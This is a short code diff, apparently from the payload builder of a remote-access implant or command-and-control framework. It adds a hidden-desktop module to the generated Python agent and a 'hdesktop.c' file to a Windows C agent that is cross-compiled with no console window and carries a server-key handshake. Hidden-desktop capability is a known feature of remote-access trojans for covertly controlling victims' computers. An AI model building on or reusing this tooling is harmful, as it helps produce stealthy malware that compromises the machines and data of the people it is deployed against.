@@ -1231,6 +1231,9 @@ def {cmd_func}(cmd):
 
         from crypto.handshake import ServerIdentity, agent_wire_source
         wire_src = agent_wire_source(ServerIdentity.load().pub)
+        hd_path = self.templates_dir / 'hidden_desktop.py'
+        if hd_path.exists():
+            wire_src += '\n' + hd_path.read_text()
         shebang_at = content.find('\n', content.find('#!'))
         if shebang_at > 0:
             content = content[:shebang_at + 1] + '\n' + wire_src + '\n' + content[shebang_at + 1:]
@@ -1803,12 +1806,15 @@ def {cmd_func}(cmd):
         x25519_src = c_src.parent / 'x25519.c'
         if x25519_src.exists():
             src_files.append(str(x25519_src))
+        hd_c = c_src.parent / 'hdesktop.c'
+        if hd_c.exists():
+            src_files.append(str(hd_c))
         if ghost_src.exists():
             src_files.append(str(ghost_src))
 
         build_cmd = [mingw] + src_files + [
             '-o', str(out_path),
-            '-lwinhttp', '-lbcrypt', '-Os', '-mwindows',
+            '-lwinhttp', '-lbcrypt', '-luser32', '-lgdi32', '-Os', '-mwindows',
         ]
 
         print(f"[*] Cross-compiling C agent for Windows x64...")
